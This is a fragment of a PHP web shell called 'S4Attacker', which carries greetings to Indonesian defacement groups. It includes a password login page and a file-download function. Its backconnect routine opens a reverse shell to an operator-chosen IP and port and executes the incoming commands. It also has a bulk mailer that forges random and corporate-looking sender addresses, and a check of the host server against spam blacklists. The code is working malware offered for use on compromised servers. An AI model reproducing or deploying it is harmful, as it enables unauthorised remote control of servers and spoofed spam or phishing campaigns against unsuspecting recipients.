Email, Name, Message-ID Domain, Subject, Alt-Body-Message, Main-Message, and FileName Attachment

~/Greetz: Mr.J0n3s, Dzha, Cester Matthew, Devinclous, AntonKill, Herbet, Evans_Hnc, Mdn_Newbie, HSH, devilzc0de, Palembang Hacker Link, SevenCrew and All Defacer Indonesian
</font>
	<?php
}
function download($dir){
	$dir = urldecode($dir);
        if(is_file($dir) || is_readable($dir)) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=".basename($dir));
            if (function_exists("mime_content_type")) {
                $type = @mime_content_type($dir);
                header("Content-Type: ".$type);
            }
            $fp = @fopen($dir, "r");
            if($fp) {
                while(!@feof($fp))
                    echo @fread($fp, 1024);
                fclose($fp);
            }
        } elseif(is_dir($dir) || is_readable($dir)) {

        }
        exit;
}
function backconnect(){
	$ipaddress = $_POST['ipaddress']; 
	$port = $_POST['port'];
	if(!empty(preg_match("/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/", $ipaddress)) && !empty(preg_match("/^[0-9]*$/", $port))){ 
		$connect = fsockopen($ipaddress, $port, $errno, $errstr); 
		if (!$connect){ 
			echo alert("Failed connect!");
		} 
		else{
			echo alert("Success connect!"); 
			$headers = array();
			$headers[] = "";
			$headers[] = "         __|  | |    \    |    |                |              "; 
			$headers[] = "       \__ \ __ _|  _ \    _|   _|   _` |   _|  | /   -_)   _| ";
			$headers[] = "       ____/   _| _/  _\ \__| \__| \__,_| \__| _\_\ \___| _|	 ";
			$headers[] = "";
			$headers[] = "                            [ Backconnect Success!]";
			$headers[] = system("uname -a");
			$headers[] = system("pwd");
			$headers[] = system("id");
			$headers[] = "";
			foreach(implode("\n", $headers) as $print){
				fputs($connect, $print);
			}
			while(!feof($connect)){  
				fputs ($connect);
				$result = fgets($connect, 8192); 
				$message=`$result`; 
				fputs($connect, "[$".system("whoami")."] ".$message."\n"); 
			} 
			fclose ($connect);
		}
	}else{
		echo alert("Please input valid data!");
	}
}
function sendmail($send){
	ob_start();
	$mailing_list = explode("\r\n", $send["mailing-list"]);
	$total_mailing_list = count($mailing_list);
	$o = 1;
	foreach($mailing_list as $mailaddress){
		$send["mailaddress"] = $mailaddress;
		if(send_it($send)){
			$stat = "successfully!";
		}else{
			$stat = "failed!";
		}
		echo "[".$o." : ".$total_mailing_list."] ".$mailaddress." -> ".$stat."\r\n";
		$o += 1;
		ob_flush();
        flush();
	}
	ob_end_flush();
}
function createDir($dir){
	$mkdir = mkdir($dir)?alert("Success!"):alert("Failed!");
	return $mkdir;
}
function alert($message){
	return '<script>alert("'.$message.'");</script>';
}
function color($a){
	$x = array(
		"",
		"#171717",
		"#353535",
		"#002735",
		"#04417b",
	);
	return $x[$a];
}
function login(){
	$a = "<title>S4Attacker - Login</title>
		<style>
			body{
				color: lime;
				font-family: 'Lucida Console';
				font-size:12px;
				padding: 10px;
			}
			input{
				background-color: #000000;
				color: lime;
			}
			input:focus, textarea:focus, select:focus{
				outline: none;
			}
		</style>
	<body bgcolor='black' onload='input_pass();' onclick='input_pass();'>
		
		<pre>";
	$a .= "<br/>";
	$a .= "<br/><font color='#ff1100'>   __|  | |    \    |    |                |                </font>";
	$a .= "<br/><font color='#ff1100'> \__ \ __ _|  _ \    _|   _|   _` |   _|  | /   -_)   _|   </font>";
	$a .= "<br/><font color='#ffffff'> ____/   _| _/  _\ \__| \__| \__,_| \__| _\_\ \___| _|     </font>";
	$a .= "<br/><font color='#ffffff'>                           copyright © 2013 - ".date("Y")."</font>";
	$a .= "</pre>";
	$a .= "<form ENCTYPE='multipart/form-data' method=\"post\">";
	$a .= "@shell password: <input id='password' style='border:0px black solid' name='password' type='password'/>";
	$a .= "</form>";
	$a .= "
		<script>
			function input_pass(){
				var input = document.getElementById('password');
				input.focus();
				input.select();
			}
		</script>
	</body>
	";
	return $a;
}
function command_replace($input, $email){
	$return = $input;
	preg_match_all("/##rand-strlowup-(\d{1,2})##/", $input, $strlowup, PREG_SET_ORDER);
	preg_match_all("/##rand-strlow-(\d{1,2})##/", $input, $strlow, PREG_SET_ORDER);
	preg_match_all("/##rand-strup-(\d{1,2})##/", $input, $strup, PREG_SET_ORDER);
	preg_match_all("/##rand-numstrlowup-(\d{1,2})##/", $input, $numstrlowup, PREG_SET_ORDER);
	preg_match_all("/##rand-numstrlow-(\d{1,2})##/", $input, $numstrlow, PREG_SET_ORDER);
	preg_match_all("/##rand-numstrup-(\d{1,2})##/", $input, $numstrup, PREG_SET_ORDER);
	preg_match_all("/##rand-num-(\d{1,2})##/", $input, $num, PREG_SET_ORDER);
	//Replace random with regex
	if(count($strlowup) >= 1){
		foreach($strlowup as $ass){
			preg_replace("/".$ass[0]."/", __genrc($ass[1], "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, -1, $count);
			for($a=1; $a <= $count; $a++){
				$return = preg_replace("/".$ass[0]."/", __genrc($ass[1], "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, 1);
			}
		}
	}if(count($strlow) >= 1){
		foreach($strlow as $ass){
			preg_replace("/".$ass[0]."/", __genrc($ass[1], "abcdefghijklmnopqrstuvwxyz"), $return, -1, $count);
			for($a=1; $a <= $count; $a++){
				$return = preg_replace("/".$ass[0]."/", __genrc($ass[1], "abcdefghijklmnopqrstuvwxyz"), $return, 1);
			}
		}
	}if(count($strup) >= 1){
		foreach($strup as $ass){
			preg_replace("/".$ass[0]."/", __genrc($ass[1], "ABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, -1, $count);
			for($a=1; $a <= $count; $a++){
				$return = preg_replace("/".$ass[0]."/", __genrc($ass[1], "ABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, 1);
			}
		}
	}if(count($numstrlowup) >= 1){
		foreach($numstrlowup as $ass){
			preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, -1, $count);
			for($a=1; $a <= $count; $a++){
				$return = preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, 1);
			}
		}
	}if(count($numstrlow) >= 1){
		foreach($numstrlow as $ass){
			preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789abcdefghijklmnopqrstuvwxyz"), $return, -1, $count);
			for($a=1; $a <= $count; $a++){
				$return = preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789abcdefghijklmnopqrstuvwxyz"), $return, 1);
			}
		}
	}if(count($numstrup) >= 1){
		foreach($numstrup as $ass){
			preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, -1, $count);
			for($a=1; $a <= $count; $a++){
				$return = preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"), $return, 1);
			}
		}
	}if(count($num) >= 1){
		foreach($num as $ass){
			preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789"), $return, -1, $count);
			for($a=1; $a <= $count; $a++){
				$return = preg_replace("/".$ass[0]."/", __genrc($ass[1], "0123456789"), $return, 1);
			}
		}
	}
	$reg = [
		"##mail##" => randmail(),
		"##time##" => date("g:i a"),
		"##date##" => date("F j, Y"),
		"##datenum##" => date("d/m/y"),
		"##fulldate##" => date("F j, Y, g:i a"),
		"##fulldatenum##" => date("d/m/y - g:i a"),
		"##random-ip##" => rand(1,255).".".rand(1,255).".".rand(1,255).".".rand(1,255),
		"##ipserver##" => $_SERVER["SERVER_ADDR"],
		"##ipclient##" => $_SERVER["REMOTE_ADDR"],
		"##random-country##" => randcountry(),
		"##random-device##" => randdevice(),
		"##email##" => $email,
		//"##shortlink##" => $settings["shortlink"][rand(0, count($settings["shortlink"])-1)],
		"##randomfrommail##" => fromemailrandom(),
		"##randomfrommail2##" => fromemailrandom2()
	];
	
	foreach($reg as $regex => $value){
		$return = str_replace($regex, $value, $return);
	}
	return $return;
}
function checkdns(){
	$dnsbl_lookup = [
        "all.s5h.net",
        "b.barracudacentral.org",
        "bl.spamcop.net",
        "blacklist.woody.ch",
        "bogons.cymru.com",
        "cbl.abuseat.org",
        "cdl.anti-spam.org.cn",
        "combined.abuse.ch",
        "db.wpbl.info",
        "dnsbl-1.uceprotect.net",
        "dnsbl-2.uceprotect.net",
        "dnsbl-3.uceprotect.net",
        "dnsbl.anticaptcha.net",
        "dnsbl.dronebl.org",
        "dnsbl.inps.de",
        "dnsbl.sorbs.net",
        "drone.abuse.ch",
        "duinv.aupads.org",
        "dul.dnsbl.sorbs.net",
        "dyna.spamrats.com",
        "dynip.rothen.com",
        "http.dnsbl.sorbs.net",
        "ips.backscatterer.org",
        "ix.dnsbl.manitu.net",
        "korea.services.net",
        "misc.dnsbl.sorbs.net",
        "noptr.spamrats.com",
        "orvedb.aupads.org",
        "pbl.spamhaus.org",
        "proxy.bl.gweep.ca",
        "psbl.surriel.com",
        "relays.bl.gweep.ca",
        "relays.nether.net",
        "sbl.spamhaus.org",
        "short.rbl.jp",
        "singular.ttk.pte.hu",
        "smtp.dnsbl.sorbs.net",
        "socks.dnsbl.sorbs.net",
        "spam.abuse.ch",
        "spam.dnsbl.anonmails.de",
        "spam.dnsbl.sorbs.net",
        "spam.spamrats.com",
        "spambot.bls.digibase.ca",
        "spamrbl.imp.ch",
        "spamsources.fabel.dk",
        "ubl.lashback.com",
        "ubl.unsubscore.com",
        "virus.rbl.jp",
        "web.dnsbl.sorbs.net",
        "wormrbl.imp.ch",
        "xbl.spamhaus.org",
        "z.mailspike.net",
        "zen.spamhaus.org",
        "zombie.dnsbl.sorbs.net",
    ];
	echo '<table>';
	foreach ($dnsbl_lookup as $host) {
		echo '<tr>';
		echo '<td>';
		echo $host;
		echo '</td>';
		echo '<td id="'.$host.'">';
		echo '...';
		echo '</td>';
		echo '</tr>';
	}
	echo '</table>';
	foreach($dnsbl_lookup as $host){
		echo "<script src='?php=checkbl&ip=".$_SERVER["SERVER_ADDR"]."&host=".$host."' type='text/javascript'></script>";
	}
}
function checkbl(){
	if (checkdnsrr($_GET["ip"].".".$_GET["host"].".", "A")){
		$stat = "Blacklist!";
		$color = 'red';
	}else{
		$stat = "Clean!";
		$color = 'green';
	}
	echo 'document.getElementById("'.$_GET["host"].'").innerHTML = "'.$stat.'";';
	echo 'document.getElementById("'.$_GET["host"].'").className = "'.$color.'";';
}
function randdevice(){
	$device = ["Apple iPhone 11 Pro Max","Apple iPhone 11 Pro","Apple iPhone 11","Apple iPad 10.2","Apple iPad Air","Apple iPad mini","Apple iPad Pro 12.9","Apple iPad Pro 11","Apple iPhone XS Max","Apple iPhone XS","Apple iPhone XR","Apple iPad 9.7","Apple iPhone X","Apple iPhone 8 Plus","Apple iPhone 8","Apple iPad Pro 10.5","Apple iPhone 7 Plus","Apple iPhone 7","Apple iPhone SE","Apple iPhone 6s Plus","Apple iPhone 6s"];
	return $device[rand(0, count($device)-1)];
}
function randcountry(){
    $country = ["Afghanistan","Zimbabwe"];
	return $country[rand(0, count($country)-1)];
}
function randmail(){
	$name = ["Aaron","Abbey","Abbie","Abby","Zulma"];
	$char = ["", "-", "_", "."];
	
	
	$domain = ["1033edge.com","11mail.com","123.com","123box.net","zydecofan.com","zzn.com","zzom.co.uk"]; 
	$email = strtolower($name[rand(0, count($name)-1)]).$char[rand(0, count($char)-1)].strtolower($name[rand(0, count($name)-1)])."@".strtolower($domain[rand(0, count($domain)-1)]);
	return $email;
}

function fromemailrandom(){
	$x = array(
		"@chuden.jp",
	);
	$y = array(
		__genrc(rand(6, 6), "abcdefghijklmnopqrstuvwxyz")
	);
	return $y[rand(0, count($y) - 1)].$x[rand(0, count($x) - 1)];
}

function fromemailrandom2(){
	$x = array(
		"info@benefit-one.co.jp",
		"anpi@mob-connect.com",
		"autrply@benefit-one.co.jp",
		"infomail@info.club-ntt-west.com",
		"mytc@tsite.jp"
	);
	return $x[rand(0, count($x) - 1)];
}
function __genrc($a, $b) {
    $c = strlen($b);
    $d = '';
    for ($i = 0; $i < $a; $i++) {
        $d .= $b[rand(0, $c - 1)];
    }
    return $d;
}
?>